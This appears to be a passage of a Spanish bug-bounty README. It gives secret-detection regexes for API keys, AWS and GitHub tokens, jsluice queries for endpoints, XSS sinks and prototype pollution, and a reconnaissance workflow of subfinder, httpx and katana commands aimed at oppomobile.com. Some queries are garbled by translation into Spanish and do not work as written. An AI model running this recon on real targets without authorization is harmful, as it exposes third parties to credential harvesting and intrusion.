(?i)(apikey|api_key|secret|token)['"\s:=]+[a-zA-Z0-9\-_.]{8,}

(?i)authorization:\s*Bearer\s+[a-zA-Z0-9\-._~+/]+=*







Añadidas: GitHub variantes y env vars explícitas

aws_session_token['"\s:=]+[A-Za-z0-9\/+=]{16,}

(?i)AWS_ACCESS_KEY_ID['"\s:=]+\w+

(?i)AWS_SECRET_ACCESS_KEY['"\s:=]+[A-Za-z0-9\/+]{40}





Añadidas: GitHub nuevas (solicitadas)

gho_[A-Za-z0-9]{36}

ghs_[A-Za-z0-9]{36}

ghu_[A-Za-z0-9]{36}

JSON / YAML multiline (tokens/keys)

(?s)(?:"(?:token|key|secret|api_key|client_secret)"\s*:\s*")[^"]{6,}(")

(?s)(?:'(?:(?:token|key|secret|api_key|client_secret)'\s*:\s*')[^']{6,}('))

(?m)^\s*(?:token|key|secret|api_key|client_secret)\s*:\s*(.+)$ (YAML-style)

(?s)"(?:authorization|Authorization|access_token)"\s*:\s*"[A-Za-z0-9\-\._~\+\/=]{8,}"







Encodings raros / Base32 / Base64 / alta entropía

(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?

(eyJ|YTo|Tzo|PD[89]|aHR0cHM6L|aHR0cDo|rO0)[a-zA-Z0-9+/]+={0,2}

['\"][A-Za-z0-9+\/]{40,}={0,2}['\"]
\b[A-Za-z0-9+/]{40,}={0,2}\b
\b[A-Za-z0-9+/]{12,}={0,2}\b
\b0x[a-fA-F0-9]{32,}\b
\b[a-fA-F0-9]{32,}\b
data:[^;]+;base64,[A-Za-z0-9+/=]+
\b[a-zA-Z]{20,}\b
[\u200B-\u200D\uFEFF]{3,}








Headers / Patterns / Logs

(?mi)^[A-Za-z0-9-]+:\s*.+$

(?mi)^set-cookie:\s*[^\r\n]+

(?mi)^(?:ERROR|WARN|INFO|DEBUG|TRACE):\s+.*$

(?i)\b(?:TODO|FIXME|DEBUG|HINT|NOTE):?.*$






HTTP Methods (Request/Response Detection & Log Analysis)
(?i)\b(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|CONNECT|TRACE|PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK|SEARCH|MERGE|PURGE|LINK|UNLINK|SUBSCRIBE|NOTIFY|REPORT|MKACTIVITY|CHECKOUT|CHECKIN|ACL|BIND|REBIND|UNBIND|MKCALENDAR|ORDERPATCH|PRI|VIEW|DESCRIBE|PLAY|ANNOUNCE|RECORD)\b



Detección de request-line (logs / proxies / archivos de captura):
(?mi)^(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|CONNECT|TRACE|PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK|SEARCH|MERGE|PURGE|LINK|UNLINK|SUBSCRIBE|NOTIFY|REPORT|MKACTIVITY|CHECKOUT|CHECKIN|ACL|BIND|REBIND|UNBIND|MKCALENDAR|ORDERPATCH|PRI|VIEW|DESCRIBE|PLAY|ANNOUNCE|RECORD)\s+\/\S*\s+HTTP\/[0-9.]+




Detección de método en líneas de log (varios formatos):
(?mi)^\s*(?:\[?\d{4}-\d{2}-\d{2}|\[?\d{2}:\d{2}:\d{2})?.*?\b(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|CONNECT|TRACE)\b.*$



Status line (HTTP version + código):

(?mi)^HTTP\/[0-9.]+\s+(1\d{2}|2\d{2}|3\d{2}|4\d{2}|5\d{2})\b




Código de estado aislado (detección simple en logs/texto):

\b(?:1\d{2}|2\d{2}|3\d{2}|4\d{2}|5\d{2})\b




Errores 4xx / 5xx (foco en fallos):

\b(?:4\d{2}|5\d{2})\b





Encabezados comunes (captura por nombre de header — útil en parsers y logs):

(?mi)^(Content-Type|User-Agent|Authorization|Host|Origin|Referer|X-Forwarded-For|X-Real-IP|Set-Cookie|Cookie|Accept|Accept-Encoding|Accept-Language|Cache-Control|Connection|Content-Length|Transfer-Encoding|Upgrade-Insecure-Requests):\s*.+$




Authorization header (dentro de tráfico / logs — captura esquema y valor):

(?mi)^Authorization:\s*(Bearer|Basic|Digest|Negotiate)\s+(.+)$




User-Agent (detección de UA no vacío):

(?mi)^User-Agent:\s*.+$




IP forwarded / client IP (X-Forwarded-For / X-Real-IP):

(?mi)^(X-Forwarded-For|X-Real-IP):\s*[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(?:,\s*[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)*$




Request/Response timing or status log common pattern:

(?mi)^(?:\[?\d{4}-\d{2}-\d{2}|\[?\d{2}:\d{2}:\d{2}).*(HTTP\/[0-9.]+|\b(?:GET|POST|PUT|DELETE)\b).*(\b[1-5][0-9]{2}\b).*$ 







```
<br><br>

2- Script con más de 65 categorías diferentes para buscar secretos: API keys, tokens, paths, funciones debug y mucho más.<br><br>

```yaml

Secrets
config
env
Rutas ocultas
routers
endpoints
Fetch
Axios
HTTP clients
Tokens
refresh flow
auth
IDOR clues
parámetros 
parámetros personalizados
end-point
end-point, personalizado
Feature flags
toggles
experiments
Redirects
return URLs
open redirect clues
Service workers
PWA
offline
CSRF
anti-forgery
DOM sinks (XSS)
.css.map
source maps
sourceMappingURL
sourcemaps
Mensajes de error (server)
Mensajes de error (client)
Formularios que previenen submit (oninput)
Formularios que previenen submit (onsubmit handlers)
formularios ocultos
Métodos HTTP
tokens
URLs (detectar patterns)
Bundlers
build
package.json scripts
devtool
CI pipelines
deploy commands
CDNs
hosts
llamadas HTTP
URL leaks
internal endpoints
Credentials & Passwords
OAuth & JWT
Database URLs
Service keys
DevOps secrets (agrupado)
(deploy commands
CD/CI task names
Encodings raros en keys (base64 + prefix).
Miscellaneous
SAML/SOAP
Custom (personalizable por framework)
Prototype pollution / parametros
Inteccion plantilla
Cors
analis de cada archivos para ver funciones ocultas


```

<br><br>

3- Configuración de categorías para buscar en jsluice.<br><br>

**Los nombres de nodo usan la convención directa tipo tree-sitter (ajustalos si tu gramática tiene otros labels).<br><br>
 Ajustar nodos según gramática cargada (tree-sitter-javascript / typescript / html).<br><br>
 Verificar con: jsluice parse archivo.js → muestra nodos reales.**

<br><br>


```yaml

¿Qué significa “ajustar con su gramática”?

Cuando usás jsluice, semgrep, o cualquier herramienta basada en tree-sitter, las consultas ((function_declaration ...), (call_expression ...), etc.) se apoyan en nodos del árbol sintáctico (AST).
Pero no todas las gramáticas usan exactamente los mismos nombres de nodo.

Ejemplo:

En tree-sitter-javascript, una declaración de función se llama
function_declaration.

En tree-sitter-typescript, el mismo nodo se llama igual,
pero los parámetros internos (parameter) pueden tener un wrapper distinto (required_parameter).

En tree-sitter-html, un nodo de script se llama script_element, no elemento_de_script.

Entonces, “ajustar con su gramática” significa verificar qué gramática (.so o .wasm) está cargando jsluice y, si los nodos difieren, adaptar tus queries.

2. ¿Cómo saber qué gramática estás usando?

Hay tres formas simples:

Comando jsluice directo:

jsluice info


o

jsluice grammar


(te devuelve qué parser/grammar está activo: tree-sitter-javascript, tree-sitter-typescript, etc.)

Por la extensión del archivo:

.js → usa tree-sitter-javascript

.ts → tree-sitter-typescript

.tsx → tree-sitter-tsx

.html / .htm → tree-sitter-html

Inspeccionando un árbol sintáctico manualmente:

jsluice parse archivo.js


Verás los nombres reales de los nodos.
Ejemplo:

(program
  (function_declaration
    name: (identifier)
    parameters: (formal_parameters (identifier))
    body: (statement_block)))


Ahí ves si tus queries usan nombres correctos o no.

3. ¿Tree-sitter es la más general?

Sí.
Tree-sitter es el parser base más usado del mundo para análisis estático moderno.
La usan VS Code, GitHub, Semgrep, SonarQube, y herramientas de seguridad como jsluice, CodeQL y Deno lint.

Cobertura de lenguajes → ~95 % del ecosistema JS/TS/HTML moderno.

Compatibilidad sintáctica entre gramáticas JS/TS → ~85 % idéntica (solo difieren algunos nodos en types, decorators, o jsx/tsx).

Así que, en porcentaje:

JS / TS / TSX comparten ≈ 85-90 % de los nodos.

HTML comparte ≈ 60-70 % (por estructura DOM distinta).

4. ¿Y el tema de los nodos distintos (HTML/TSX/TS)?

HTML:

<script> → script_element

<link> → element

<attribute> y attribute_name/value en lugar de pair key/value.

TSX:

Combina nodos JS + JSX: jsx_element, jsx_attribute, jsx_text.

TS:

Igual a JS, pero agrega type_annotation, interface_declaration, decorator.

Por eso, si querés portabilidad, mantené dos juegos de queries:

Uno base JS (tree-sitter-javascript)

Uno extendido (añadiendo nodos jsx_ y html_)

```

<br><br>

 

```yaml

10 ejemplos prácticos de consultas para ' jsluice ' para extraer datos interesantes de archivos JavaScript:

Extraiga todos los nombres de funciones
consulta jsluice -q "(nombre de declaración de función: (identificador) @nombre_de_función)" su_archivo.js

Encuentra todas las variables declaradas
consulta jsluice -q "(declarador_de_variable id: (identificador) @variable)" su_archivo.js

Identifica todas las cadenas utilizadas
consulta jsluice -q "(cadena) @string_value" su_archivo.js

Localice todas las llamadas API
consulta jsluice -q "(función call_expression: (member_expression) @api_call)" your_file.js

Detectar el uso de 'eval'
consulta jsluice -q "(función call_expression: (nombre del identificador: 'eval'))" your_file.js

Encuentra todas las asignaciones a 'window.location'
consulta jsluice -q "(expresión_asignación izquierda: (expresión_miembro objeto: (nombre_identificador: 'ventana') propiedad: (nombre_identificador_propiedad: 'ubicación')))" your_file.js

Extraer todos los detectores de eventos
consulta jsluice -q "(función call_expression: (propiedad member_expression: (nombre property_identifier: 'addEventListener'))) @event_listener" your_file.js

Encuentra el uso de localStorage
consulta jsluice -q "(objeto member_expression: (nombre del identificador: 'localStorage'))" your_file.js

Descubra todas las XMLHttpRequests
jsluice query -q "(nueva_expresión llamada: (nombre del identificador: 'XMLHttpRequest'))" your_file.js

Identificar todos los scripts en línea en un archivo HTML
consulta jsluice -q "(elemento_de_script)" su_archivo.html






Secrets
consulta jsluice -q "(literal ((string) @secret) (#match? @secret \"[A-Za-z0-9+/=]{32,}\"))" tu_archivo.js

config
consulta jsluice -q "(object (pair key: (property_identifier) @k value: (object) @config) (#eq? @k \"config\"))" tu_archivo.js

env
consulta jsluice -q "(member_expression object: (identifier) @proc prop: (property_identifier) @envp) (#eq? @proc \"process\") (#match? @envp \"env\")" tu_archivo.js

Rutas ocultas
consulta jsluice -q "(string) @ruta (#match? @ruta \"\\/(admin|hidden|secret|internal|private|_next)\\b\")" tu_archivo.js

routers
consulta jsluice -q "(call_expression function: (member_expression object: (identifier) @router prop: (property_identifier) @method) . ) (#match? @method \"get|post|use|route\")" tu_archivo.js

endpoints
consulta jsluice -q "(call_expression function: (identifier) @fn (arguments (string) @url)) (#match? @url \"https?:\\/\\/|\\/\")" tu_archivo.js

Fetch
consulta jsluice -q "(call_expression function: (identifier) @fetch_name) (#eq? @fetch_name \"fetch\")" tu_archivo.js

Axios
consulta jsluice -q "(call_expression function: (member_expression object: (identifier) @axios prop: (property_identifier) @method)) (#eq? @axios \"axios\")" tu_archivo.js

HTTP clients
consulta jsluice -q "(new_expression constructor: (identifier) @client) (#match? @client \"Axios|HttpClient|Got|SuperAgent\")" tu_archivo.js

Tokens
consulta jsluice -q "(string) @tok (#match? @tok \"(eyJ|ghp_|AKIA|AIza)[A-Za-z0-9_\\-\\.=]{10,}\")" tu_archivo.js

refresh flow
consulta jsluice -q "(assign_expression left: (member_expression (identifier) @obj prop: (property_identifier) @prop) right: (call_expression) @refresh) (#match? @prop \"refresh_token|setRefresh\")" tu_archivo.js

auth
consulta jsluice -q "(variable_declarator name: (identifier) @a value: (object (pair key: (property_identifier) @k))) (#match? @k \"auth|authorization|credentials\")" tu_archivo.js

IDOR clues
consulta jsluice -q "(string) @idor (#match? @idor \"\\b(id|user_id|account_id|profile)\\b\")" tu_archivo.js

parámetros
consulta jsluice -q "(function_declaration parameters: (formal_parameters (identifier) @param))" tu_archivo.js

parámetros personalizados
consulta jsluice -q "(member_expression object: (identifier) @req prop: (property_identifier) @query) (#eq? @req \"req\")" tu_archivo.js

end-point
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#match? @k \"endpoint|url|route\")" tu_archivo.js

end-point, personalizado
consulta jsluice -q "(object (pair key: (property_identifier) @k value: (template_string) @tpl)) (#match? @k \"endpoint|customEndpoint\")" tu_archivo.js

Feature flags
consulta jsluice -q "(variable_declarator name: (identifier) @flag init: (boolean) @val) (#match? @flag \"enable|feature|flag|toggle|is.*Enabled\")" tu_archivo.js

toggles
consulta jsluice -q "(assignment_expression left: (member_expression object: (identifier) @cfg prop: (property_identifier) @name) right: (boolean) @v) (#match? @name \"toggle|enabled|disabled|beta\")" tu_archivo.js

experiments
consulta jsluice -q "(string) @exp (#match? @exp \"experiment|variant|bucket|test\")" tu_archivo.js

Redirects
consulta jsluice -q "(assignment_expression left: (member_expression (identifier) @win prop: (property_identifier) @loc) right: (string) @u) (#eq? @win \"window\") (#eq? @loc \"location\")" tu_archivo.js

return URLs
consulta jsluice -q "(call_expression function: (member_expression object: (identifier) @res prop: (property_identifier) @redir) arguments: (string) @url) (#match? @redir \"redirect|location\")" tu_archivo.js

open redirect clues
consulta jsluice -q "(call_expression function: (member_expression object: (identifier) @res prop: (property_identifier) @redir) arguments: (member_expression object: (identifier) @req prop: (property_identifier) @q)) (#match? @q \"next|redirect|url|return_to\")" tu_archivo.js

Service workers
consulta jsluice -q "(call_expression function: (member_expression object: (identifier) @self prop: (property_identifier) @add) arguments: (string) @evt) (#eq? @self \"self\") (#eq? @add \"addEventListener\") (#match? @evt \"fetch|install|activate\")" tu_archivo.js

PWA
consulta jsluice -q "(object (pair key: (property_identifier) @k value: (string) @v) ) (#match? @k \"manifest|serviceWorker|start_url|scope\")" tu_archivo.js

offline
consulta jsluice -q "(string) @s (#match? @s \"offline|cache|fallback|offline.html\")" tu_archivo.js

CSRF
consulta jsluice -q "(member_expression object: (identifier) @req prop: (property_identifier) @body) (#match? @body \"csrf|csrfToken|_csrf\")" tu_archivo.js

anti-forgery
consulta jsluice -q "(call_expression function: (identifier) @verify) (#match? @verify \"verifyCsrf|checkCsrf|csrfProtection\")" tu_archivo.js

Comentarios
consulta jsluice -q "(comment) @c" tu_archivo.js

TODO
consulta jsluice -q "(comment) @c (#match? @c \"TODO|FIXME|BUG\")" tu_archivo.js

DEBUG
consulta jsluice -q "(call_expression function: (member_expression object: (identifier) @con prop: (property_identifier) @log) arguments: (string) @msg) (#eq? @con \"console\") (#match? @log \"log|debug|error|warn\")" tu_archivo.js

hints
consulta jsluice -q "(comment) @c (#match? @c \"hint|note|consider|remember\")" tu_archivo.js

DOM sinks (XSS)
consulta jsluice -q "(assignment_expression left: (member_expression object: (identifier) @el prop: (property_identifier) @prop) right: (string) @s) (#match? @prop \"innerHTML|outerHTML|innerText|outerText|innerHTML\")" tu_archivo.js

.css.map
consulta jsluice -q "(string) @s (#match? @s \"\\.css\\.map|sourceMappingURL\")" tu_archivo.js

source maps
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#match? @v \"sourceMappingURL|\\.map\")" tu_archivo.js

sourceMappingURL
consulta jsluice -q "(string) @s (#match? @s \"sourceMappingURL\")" tu_archivo.js

sourcemaps
consulta jsluice -q "(call_expression function: (identifier) @fn) (#match? @fn \"sourceMap|sourceMapping\")" tu_archivo.js

Mensajes de error (server)
consulta jsluice -q "(throw_statement (new_expression constructor: (identifier) @err (arguments (string) @msg))) (#match? @err \"Error|HttpError|BadRequest\")" tu_archivo.js

Mensajes de error (client)
consulta jsluice -q "(call_expression function: (member_expression object: (identifier) @con prop: (property_identifier) @m) arguments: (string) @msg) (#eq? @con \"console\") (#match? @m \"error|warn|info\")" tu_archivo.js

Variables
consulta jsluice -q "(variable_declarator name: (identifier) @v)" tu_archivo.js

regex
consulta jsluice -q "(new_expression constructor: (identifier) @rx (arguments (string) @pat)) (#eq? @rx \"RegExp\")" tu_archivo.js

nombres de constantes comunes
consulta jsluice -q "(variable_declarator name: (identifier) @n) (#match? @n \"(API|API_URL|BASE_URL|TOKEN|SECRET|KEY|CONFIG)\")" tu_archivo.js

Formularios que previenen submit (oninput)
consulta jsluice -q "(call_expression function: (member_expression object: (identifier) @el prop: (property_identifier) @ad) arguments: (string) @evt) (#eq? @ad \"addEventListener\") (#match? @evt \"input|oninput\")" tu_archivo.js

Formularios que previenen submit (onsubmit handlers)
consulta jsluice -q "(call_expression function: (member_expression object: (identifier) @el prop: (property_identifier) @ad) arguments: (string) @evt (arrow_function) @fn) (#match? @evt \"submit\")" tu_archivo.js

formularios ocultos
consulta jsluice -q "(html_element name: (identifier) @tag (attribute (attribute_name (identifier) @attr) (attribute_value (string) @val))) (#eq? @tag \"form\") (#match? @val \"display:\\s*none|hidden|type=['\\\"]hidden['\\\"])\" )" tu_archivo.html

Métodos HTTP
consulta jsluice -q "(string) @mth (#match? @mth \"\\b(GET|POST|PUT|DELETE|PATCH|OPTIONS|HEAD|CONNECT|TRACE)\\b\")" tu_archivo.js

tokens
consulta jsluice -q "(string) @t (#match? @t \"(Bearer|Basic|ghp_|gho_|ghs_|ghu_|AKIA|AIza|eyJ)[A-Za-z0-9_\\-\\.=]{10,}\")" tu_archivo.js

URLs (detectar patterns)
consulta jsluice -q "(string) @u (#match? @u \"https?:\\/\\/|\\/api\\/|\\/internal\\/|\\.(example|local|svc)\\b\")" tu_archivo.js

Bundlers
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#match? @k \"devtool|mode|target\")" webpack.config.js

build
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#match? @k \"build|bundle|output\")" package.json

package.json scripts
consulta jsluice -q "(property key: (string) @k value: (object) @scripts) (#match? @k \"\\\"scripts\\\"\")" package.json

devtool
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#eq? @k \"devtool\")" webpack.config.js

CI pipelines
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#match? @k \"circleci|travis|github|gitlab|pipeline|jenkins\")" .github/**

deploy commands
consulta jsluice -q "(object (pair key: (property_identifier) @k value: (string) @v)) (#match? @k \"deploy|release|publish\")" package.json

CDNs
consulta jsluice -q "(string) @cdn (#match? @cdn \"cdn\\.jsdelivr|cdnjs|unpkg|cdn\\.azure|cloudfront|akamai\")" tu_archivo.js

hosts
consulta jsluice -q "(string) @h (#match? @h \"[a-z0-9-]+\\.(com|internal|svc|local|example)\")" tu_archivo.js

llamadas HTTP
consulta jsluice -q "(call_expression function: (identifier) @c) (#match? @c \"fetch|axios|get|post|request|superagent|got\")" tu_archivo.js

URL leaks
consulta jsluice -q "(string) @u (#match? @u \"\\/\\.env|\\/config|\\/credentials|\\/secrets\")" tu_archivo.js

internal endpoints
consulta jsluice -q "(string) @ie (#match? @ie \"internal|_internal|private|admin|svc|backend\")" tu_archivo.js

Credentials & Passwords
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#match? @k \"password|passwd|secret|credential|key|token\")" tu_archivo.js

OAuth & JWT
consulta jsluice -q "(string) @jwt (#match? @jwt \"^eyJ[A-Za-z0-9\\-_=]+\\.[A-Za-z0-9\\-_=]+\\.[A-Za-z0-9\\-_=]+$\")" tu_archivo.js

Database URLs
consulta jsluice -q "(string) @db (#match? @db \"^(mongodb|postgres|mysql|redis|jdbc):\\\\/\\\\/\")" tu_archivo.js

Service keys
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#match? @k \"apiKey|serviceKey|accessKey|secretKey\")" tu_archivo.js

DevOps secrets (agrupado)
consulta jsluice -q "(member_expression object: (identifier) @env prop: (property_identifier) @s) (#match? @env \"process|env|secrets|Vault\")" tu_archivo.js

CD/CI task names
consulta jsluice -q "(string) @task (#match? @task \"deploy|build|test|release|publish|ci|pipeline\")" tu_archivo.js

Encodings raros en keys (base64 + prefix)
consulta jsluice -q "(string) @enc (#match? @enc \"(^[A-Za-z0-9+/]{20,}={0,2}$|^base64:|^b64:\\/\\/)\" )" tu_archivo.js

Miscellaneous
consulta jsluice -q "(identifier) @id" tu_archivo.js

headers
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#match? @k \"Authorization|Content-Type|X-Forwarded-For|Set-Cookie|Cookie\")" tu_archivo.js

patterns
consulta jsluice -q "(string) @p (#match? @p \"TODO|FIXME|HACK|DEBUG|NOTE\")" tu_archivo.js

patterns de logs
consulta jsluice -q "(string) @l (#match? @l \"ERROR|WARN|INFO|DEBUG|TRACE|Request|Response\")" tu_archivo.js

SAML/SOAP
consulta jsluice -q "(call_expression function: (identifier) @soap) (#match? @soap \"soap|wsdl|SAML|saml2|Assertion\")" tu_archivo.js

Custom (personalizable por framework)
consulta jsluice -q "(call_expression function: (identifier) @fn) (#match? @fn \"useRouter|createApp|ngOnInit|mount|bootstrap\")" tu_archivo.js

Prototype pollution / parametros
consulta jsluice -q "(assignment_expression left: (member_expression object: (identifier) @obj prop: (identifier) @prop) right: (identifier) @val) (#match? @prop \"__proto__|prototype|constructor\")" tu_archivo.js

Inyeccion plantilla
consulta jsluice -q "(template_string) @tpl (#match? @tpl \"\\{\\{|%|<%|\\$\\{\")" tu_archivo.js

Cors
consulta jsluice -q "(pair key: (property_identifier) @k value: (string) @v) (#match? @k \"Access-Control-Allow-Origin|CORS|allowedOrigins\")" tu_archivo.js

analisis de cada archivo para ver funciones ocultas
consulta jsluice -q "(function_declaration name: (identifier) @fn body: (statement_block) @body) (#match? @fn \".*\")" tu_archivo.js




```

<br><br>


4- Pasarle todo este repositorio completo, por partes, a tu IA preferida para que aprenda de él: crear una nueva conversación y enviarle el contenido por secciones (excepto las 3 tools ya creadas). Usar la IA solo como guía para el análisis de código y aprendizaje, no para ejecutar las herramientas por separado subir en formato PDF es una segunda opción por partes.



<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExMzhwcjVwbmRsazd6cTh3M3l2cmh1eTIxYmh3YmF6Yzk3c2ZuZzBvMiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/uRoZBofy2cTCvz18we/giphy.gif" width = 80px>  </picture> “Metodología Aquiles”

#  9

**En esta sección encontrarás mi metodología exacta y todo el proceso: desde la recolección de subdominios y la validación de que están vivos, hasta los comandos de cada herramienta utilizados en cada fase. También detallo cuándo y cómo empleo mis scripts personalizados, el flujo de recolección de archivos (.js, entre otros), y el proceso de análisis manual posterior , link referencia https://www.youtube.com/watch?v=VpDmOjDqmh8**
<br><br>

 1- Paso de recolección de subdominios del target y validación de cuáles están vivos.

```yaml
Subfinder — salida simple
subfinder -d oppomobile.com -o subfinder.txt


Resumen:
Recopila subdominios pasivos para oppomobile.com y guarda la lista cruda en subfinder.txt.
```
<br><br>

```yaml
Subfinder — canalizar, deduplicar y limpiar
subfinder -d oppomobile.com -silent -o - | sort -u | tee subs.txt


Resumen:
Ejecuta subfinder en modo silencioso, envía la salida al STDOUT, elimina duplicados y guarda en subs.txt.
```
<br><br>

```yaml
Subfinder + crt.sh + dedupe (más cobertura)
(subfinder -d oppomobile.com -silent -o - ; echo "oppomobile.com" | gau --subs ) | sort -u | tee subs_extended.txt


Resumen:
Combina salida de subfinder con URLs/subdominios extraídos por gau (para ampliar cobertura), luego deduplica y guarda en subs_extended.txt.
```
<br><br>

```yaml
Comprobar vivos con httpx (recomendado)
httpx -l subs.txt -silent -timeout 10 -threads 50 -status-code -title -o alive-httpx.txt


Resumen:
Comprueba qué subdominios/respuestas HTTP están vivos y guarda código de estado + título en alive-httpx.txt.
```
<br><br>

```yaml
httpx -l subs.txt -silent -mc 200,301 -o alive-200-301.txt
Resumen:
Filtra resultados vivos que devuelvan 200 o 301 y los guarda en alive-200-301.txt.
```

<br><br>

```yaml
Alternativa: comprobación simple con httprobe
cat subs.txt | httprobe -c 50 | sed 's|http://||;s|https://||' | sort -u | tee alive-httprobe.txt


Resumen:
Pasa la lista a httprobe para obtener endpoints HTTP/HTTPS vivos, limpia el prefijo y guarda en alive-httprobe.txt.
```
<br><br>


 2- Paso de uso de las herramientas para recolección masiva.

```yaml
cat urls.txt | grep -E '\.js$|\.json$' | sort -u | tee js.txt
Resumen: filtra de urls.txt las URLs que terminan en .js o .json, elimina duplicados y guarda la lista única en js.txt.
```
<br><br>
```yaml
cat *.txt results/*.txt | sort -u > urls.txt
Resumen:
Concatena todos los .txt del directorio actual y results/, elimina duplicados (sort -u) y guarda todo en urls.txt.
```
<br><br>
```yaml
paramspider -d "*.oppomobile.com"
Resumen:
Usa ParamSpider para recolectar URLs con parámetros desde todos los subdominios de oppomobile.com.
```
<br><br>
```yaml
waymore -i oppomobile.com -mode U -oU waymore.txt
Resumen:
Con Waymore, obtiene URLs archivadas del dominio en Wayback Machine y guarda las únicas (-oU) en waymore.txt.
```
<br><br>
```yaml
echo "oppomobile.com" | waybackurls | tee wayback.txt
Resumen:
Genera todas las URLs históricas de oppomobile.com usando waybackurls, y las guarda en wayback.txt.
```
<br><br>
```yaml
cat ../all-live.txt | hakrawler -d 5 -t 30 -subs -u | tee hakrawler.txt
Resumen:
Ejecuta Hakrawler sobre los dominios vivos listados en all-live.txt, rastreando hasta profundidad 5, con 30 threads y subdominios, exportando a hakrawler.txt.
```
<br><br>
```yaml
urlfinder -d oppomobile.com -all -o urlfinder.txt
Resumen:
Ejecuta UrlFinder para extraer todos los endpoints, JS y URLs posibles del dominio oppomobile.com, guardando en urlfinder.txt.
```
<br><br>
```yaml
katana -list ../all-live.txt -d 5 -f qurl -o katana-params.txt
Resumen:
Usa Katana para rastrear con profundidad 5, extrayendo parámetros (-f qurl) desde los dominios vivos, guardando en katana-params.txt.
```
<br><br>
```yaml
katana -list ../all-live.txt -d 5 -jc -c 50 -o katana_normal_scan.txt
Resumen:
Crawl normal con Katana, parseando JavaScript (-jc) con concurrencia de 50 threads; resultados en katana_normal_scan.txt.
```
<br><br>
```yaml
katana -list ../all-live.txt -d 5 -jc -aff -fx -s breadth-first -o katana-bf.txt
Resumen:
Crawl amplio (breadth-first) con análisis JS, extracción de formularios (-fx), archivos (-aff), y salida en katana-bf.txt.
```
<br><br>
```yaml
katana -list ../all-live.txt -d 5 -jc -aff -fx -s depth-first -o katana-df.txt
Resumen:
Crawl profundo (depth-first) con análisis JS, extracción de formularios y archivos, resultados en katana-df.txt.

```


<br><br>
```yaml
Recolectar con Burp Suite fitrandos extenciones de archivos js etc en configuracion y scoupe limitar solo al tarjet
navegador por el sitio web en cada funcion etc para recolectar archivos estaticos como dinamicos y luego repetir este proceso
estando autenticado etc.

```



<br><br>


 3- Paso de uso de las herramientas creadas.

```yaml
Usar el scrpyt tool 1 reglas regex  140 aproximado lanzar bash  el archivo analizar de a uno para mirar algo rapido a ver si sale

```
<br><br>

```yaml
Usar el scrpyt tool 2  de las 70 categorias con sus 200 palabras claves en cada categoria lanzar bash  el archivo analizar de a uno para mirar algo rapido a ver si sale

```

<br><br>


 4- Paso de análisis manual entendiendo la lógica.

```yaml
Usar la tool 3 para analisis de js mas  a profundidad y ademas combinar con la IA que tiene el repo este y el contexto total
buscar funciones ocultas , funciones vulnerables , logica mal construida , idor , inyeccion de plantilla , protype polluction / paramtros , cors , xss doom , rce ,
open redirect etc.

```
<br><br>




<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3YwbG9zbmU1amprdTJsbmxzYnpobzd5eGtnazB6b2FmdnllaTRhZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/h8UlsEpqiCISTKUzvz/giphy.gif" width = 80px>  </picture> “Cada .js es un mapa oculto: si sabés leerlo, encontrás el tesoro.”
<br>


<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
